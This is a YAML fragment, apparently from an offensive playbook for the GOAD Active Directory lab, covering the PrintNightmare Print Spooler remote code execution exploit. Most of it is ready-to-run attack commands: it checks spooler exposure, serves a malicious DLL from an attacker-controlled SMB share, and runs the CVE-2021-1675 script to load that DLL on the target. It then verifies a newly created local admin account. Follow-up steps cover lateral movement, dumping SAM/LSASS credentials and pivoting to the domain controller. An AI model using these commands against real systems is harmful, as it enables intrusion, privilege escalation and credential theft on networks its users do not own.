      - spooler
    description: >
      Exploit Windows Print Spooler RCE to achieve SYSTEM-level code execution
      or add local admin user. GOAD's Meereen (Server 2016 unpatched) is
      vulnerable. Works remotely with any domain user credentials.
    commands:
      - label: "Check if Print Spooler is running"
        cmd: "nxc smb {SUBNET} -u {USERNAME} -p '{PASSWORD}' -M spooler"
      - label: "Check via rpcdump"
        cmd: "impacket-rpcdump @{TARGET_IP} | grep -E 'MS-RPRN|MS-PAR'"
      - label: "Serve malicious DLL via SMB share"
        cmd: "impacket-smbserver -smb2support ATTACKERSHARE /tmp/dll/"
      - label: "Exploit PrintNightmare remotely"
        cmd: "python3 CVE-2021-1675.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} '\\\\{ATTACKER_IP}\\ATTACKERSHARE\\evil.dll'"
      - label: "Check if new local admin was created"
        cmd: "nxc smb {TARGET_IP} -u 'localadmin' -p 'Passw0rd123!' --local-auth"
    next:
      - Use new local admin for lateral movement
      - Dump SAM/LSASS for credential material
      - Pivot to domain controller from compromised host
    opsec: >
      Very loud — spooler service events (7045) and process creation events
